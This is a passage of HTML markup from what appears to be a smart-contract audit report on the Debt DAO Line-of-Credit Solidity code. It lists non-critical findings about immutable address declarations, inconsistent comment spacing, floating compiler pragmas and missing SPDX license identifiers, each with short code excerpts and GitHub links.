class=\"mtk1\">:       </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">oracle</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit seen in contracts/modules/credit/LineOfCredit.sol </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">29</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L27\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L27</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"68\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">factories</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit seen in contracts/modules/credit/LineOfCredit.sol </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">16</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">arbiter</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit seen in contracts/modules/escrow/Escrow.sol </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">17</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">oracle</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit seen in contracts/modules/credit/SpigotedLine.sol </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">18</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">swapTarget</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/factories/LineFactory.sol#L16\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/factories/LineFactory.sol#L16</a></p>\n<h2 id=\"n12--inconsistent-spacing-in-comments\" style=\"position:relative;\"><a href=\"#n12--inconsistent-spacing-in-comments\" aria-label=\"n12  inconsistent spacing in comments permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑12]  Inconsistent spacing in comments</h2>\n<p>Some lines use <code>// x</code> and some use <code>//x</code>. The instances below point out the usages that don’t follow the majority, within each file.</p>\n<p><em>There are 2 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"69\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineOfCredit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">58</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">deadline</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">ttl_</span><span class=\"mtk1\">;  </span><span class=\"mtk3\">//the deadline is the term/maturity/expiry date of the Line of Credit facility</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">526</span><span class=\"mtk1\">:                    </span><span class=\"mtk12\">credits</span><span class=\"mtk1\">[</span><span class=\"mtk12\">id</span><span class=\"mtk1\">].</span><span class=\"mtk12\">principal</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> </span><span class=\"mtk3\">//`id` should be placed before `p` </span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L58\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L58</a></p>\n<h2 id=\"n13--non-libraryinterface-files-should-use-fixed-compiler-versions-not-floating-ones\" style=\"position:relative;\"><a href=\"#n13--non-libraryinterface-files-should-use-fixed-compiler-versions-not-floating-ones\" aria-label=\"n13  non libraryinterface files should use fixed compiler versions not floating ones permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑13]  Non-library/interface files should use fixed compiler versions, not floating ones</h2>\n<p><em>There are 5 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"70\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineOfCredit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L1\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L1</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"71\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SecuredLine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L1\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L1</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"72\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SpigotedLine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L1\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L1</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"73\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interest</span><span class=\"mtk1\">-</span><span class=\"mtk12\">rate</span><span class=\"mtk1\">/</span><span class=\"mtk12\">InterestRateCredit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L1\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L1</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"74\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">oracle</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Oracle</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/oracle/Oracle.sol#L2\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/oracle/Oracle.sol#L2</a></p>\n<h2 id=\"n14--file-does-not-contain-an-spdx-identifier\" style=\"position:relative;\"><a href=\"#n14--file-does-not-contain-an-spdx-identifier\" aria-label=\"n14  file does not contain an spdx identifier permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑14]  File does not contain an SPDX Identifier</h2>\n<p><em>There are 16 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"75\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EscrowedLine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">0</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/EscrowedLine.sol#L0\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/EscrowedLine.sol#L0</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"76\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineOfCredit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">0</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L0\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L0</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"77\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SecuredLine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">0</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L0\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L0</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"78\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">SpigotedLine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">0</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L0\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L0</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"79\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">escrow</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Escrow</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">0</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L0\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L0</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"80\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">factories</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LineFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">0</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/factories/LineFactory.sol#L0\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/factories/LineFactory.sol#L0</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"81\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interest</span><span class=\"mtk1\">-</span><span class=\"mtk12\">rate</span><span class=\"mtk1\">/</span><span class=\"mtk12\">InterestRateCredit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">0</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L0\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L0</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"82\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">spigot</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Spigot</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">0</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L0\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L0</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"83\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CreditLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">0</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L0\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L0</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"84\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CreditListLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">0</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditListLib.sol#L0\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditListLib.sol#L0</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"85\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EscrowLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">0</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">9</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L0\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L0</a></p>\n<pre 